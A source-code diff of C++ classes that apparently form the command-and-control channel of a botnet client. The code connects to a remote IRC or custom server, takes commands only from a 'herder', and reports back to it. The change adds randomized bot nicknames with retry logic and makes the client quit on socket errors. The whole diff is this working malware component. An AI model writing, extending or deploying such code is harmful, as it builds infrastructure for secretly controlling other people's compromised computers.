@@ -1,35 +1,41 @@
 #include "Environment.hpp"
 #include "Channels.hpp"
 #include "SecureSocket.hpp"
+#include "Random.hpp"
 
 using namespace Legit;
 using namespace std;
 
-IrcCommandChannel::IrcCommandChannel(string host, string port, string channel, string nick, string herder, string pem) :
+IrcCommandChannel::IrcCommandChannel(string host, string port, string channel, string herder, string pem) :
     channel_(channel),
     herder_(herder),
-    client_(make_unique<SecureSocket>(host, port, make_unique<CertStore>(pem, false), 500), nick)
+    client_(nullptr)
 {
-    while (!client_.ReceivedFirstPing())
+    RandomGenerator rng;
+    nick_ = rng.GetString(Legit::ALPHA_MIXED, 1) + rng.GetString(Legit::ALPHA_NUMERIC_MIXED, 15);
+     
+    client_ = make_unique<IrcClient>(make_unique<SecureSocket>(host, port, make_unique<CertStore>(pem, false), 500), nick_);
+
+    while (!client_->ReceivedFirstPing())
     {
-        client_.Receive();
+        client_->Receive();
     }
-    client_.Send("JOIN " + channel + "\r\n");
+    client_->Send("JOIN " + channel + "\r\n");
 }
 
 IrcCommandChannel::~IrcCommandChannel()
 {
-    client_.Send("QUIT out\r\n");
+    client_->Send("QUIT out\r\n");
 }
 
 void IrcCommandChannel::Send(string message)
 {
-    client_.Send("PRIVMSG " + herder_ + " :" + message + "\r\n");
+    client_->Send("PRIVMSG " + herder_ + " :" + message + "\r\n");
 }
 
 string IrcCommandChannel::Receive()
 {
-    auto message = client_.Receive();
+    auto message = client_->Receive();
     if (message.command == "PRIVMSG")
     { 
         if (message.params[0] == channel_ || message.GetReturnName() == herder_)
@@ -39,11 +45,19 @@ string IrcCommandChannel::Receive()
     return "";
 }
 
-CustomCommandChannel::CustomCommandChannel(string host, string port, string nick, string pem) : 
+CustomCommandChannel::CustomCommandChannel(string host, string port, string pem) : 
     //socket_(make_unique<SecureSocket>(host, port, make_unique<CertStore>(pem, false)))
     socket_(make_unique<Socket>(host, port))
 {
-    socket_->Send(nick + "\r\n");
+    RandomGenerator rng;
+
+    nick_ = rng.GetString(Legit::ALPHA_MIXED, 1) + rng.GetString(Legit::ALPHA_NUMERIC_MIXED, 15);
+    socket_->Send(nick_ + "\r\n");
+    while (Receive() != "OK")
+    {
+        nick_ = rng.GetString(Legit::ALPHA_MIXED, 1) + rng.GetString(Legit::ALPHA_NUMERIC_MIXED, 15);
+        socket_->Send(nick_ + "\r\n");
+    }
 }
 
 CustomCommandChannel::~CustomCommandChannel()
@@ -67,7 +81,7 @@ string CustomCommandChannel::Receive()
         if (bytesRead >= 0)
             remains_.append(buffer, bytesRead);
         else
-            return "";
+            return "quit"; // Socket error
         endline = remains_.find("\r\n");
     }
 
